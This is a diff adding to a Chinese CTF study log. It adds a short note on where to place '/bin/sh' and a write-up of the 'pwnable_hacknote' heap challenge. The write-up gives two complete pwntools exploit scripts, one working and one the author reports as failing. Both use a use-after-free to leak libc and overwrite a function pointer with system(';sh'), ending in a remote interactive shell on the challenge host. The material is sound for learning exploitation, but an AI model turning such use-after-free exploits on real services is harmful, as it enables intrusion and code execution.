@@ -15,6 +15,11 @@ tags:
     - 学习日志
 ---
 
+关于 `/bin/sh` 填在哪里的问题：
+
+* 如果是覆写 got 表，那么写在指针指向的数据区。
+* 如果是改写函数指针，且程序把结构体首地址作为参数传了进去，那么把传进函数的地址直接改写成 `;sh\x00`。
+
 
 ### babyheap_0ctf_2017
 
@@ -773,3 +778,144 @@ if __name__ == "__main__":
 
 ```
 
+### pwnable_hacknote
+
+[题目链接](https://buuoj.cn/challenges#pwnable_hacknote)
+
+随便申请几个 chunk，发现是 manage_chunk + user_chunk 模式，manage_chunk 上依次放着 0，manage_chunk_size（0x11），_puts_w 的地址（0x0804862b），user_chunk_user_data 的起始地址。
+
+简单检查一下，Add 函数没有检查堆长度，可以任意溢出，但是这个不是 update，疑似溢出了也不能覆盖下面申请的 chunk，没什么用吧。
+
+delete 函数也没有把头指针置 0。
+
+存储头指针的数组在 bss 段上，0x804A050。
+
+没有 system 的 plt。
+
+大概是 uaf，ret2libc 然后覆写 _puts_w 的地址。
+
+但是我不知道为什么，感觉这道题靶机有点问题，反正是泄露 puts 打不通，泄露 main_arena+88 可以打通。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27849
+io = remote(host,port)
+# io = process("./hacknote")
+elf = ELF("./hacknote")
+libc = ELF("./libc-2.23.so")
+puts_got = elf.got['puts']
+
+def Add(size,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline('1')
+    io.recvuntil(b"Note size :")
+    io.sendline(str(size).encode())
+    io.recvuntil(b"Content :")
+    io.send(content)
+
+def Delete(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline('2')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def Print(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline('3')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def main():
+    Add(0x80,b'A'*0x80) # index 0 
+    Add(0x80,b'B'*0x80) # index 1
+    Delete(0)
+    Add(0x80,'meow')    # index 2
+    Print(2)
+    io.recvuntil('meow')
+    libc_base = u32(io.recv(4)) - 0x1b07b0
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak one_gadget address :",hex(system))
+    Add(0x80,b'C'*0x80) # index 3
+    Delete(2)
+    Delete(3)
+    payload_1 = p32(system) + b";sh\x00"
+    Add(0x08,payload_1) # index 4
+    Print(2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+下面是我没能打通的泄露 puts 版本，有好心大蛇如果愿意帮我看一下错误并告诉我，我会感激不尽的。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27849
+io = remote(host,port)
+# io = process("./hacknote")
+elf = ELF("./hacknote")
+libc = ELF("./libc-2.23.so")
+puts_got = elf.got['puts']
+
+def Add(size,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline('1')
+    io.recvuntil(b"Note size :")
+    io.sendline(str(size).encode())
+    io.recvuntil(b"Content :")
+    io.send(content)
+
+def Delete(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline('2')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def Print(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline('3')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def main():
+    Add(0x80,b'A'*0x80) # index 0
+    Add(0x80,b'B'*0x80) # index 1
+    Delete(0)
+    Delete(1)
+    payload_0 = p32(0x0804862b) + p32(puts_got)
+    Add(0x08,payload_0) # index 2
+    Print(0)
+    leak_data = io.recvn(4)
+    io.recvline(b'\n')
+    puts_addr = u32(leak_data)
+    print("\n[+] Leak puts address :",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    # gdb.attach(io)
+    Add(0x80,b'C'*0x80) # index 3
+    Delete(2)
+    Delete(3)
+    payload_1 = p32(system) + b";sh\x00"
+    Add(0x08,payload_1)
+    # gdb.attach(io)
+    Print(2)
+    io.interactive()
+
+if __name__ == "__main__":
+
+    main()
+```
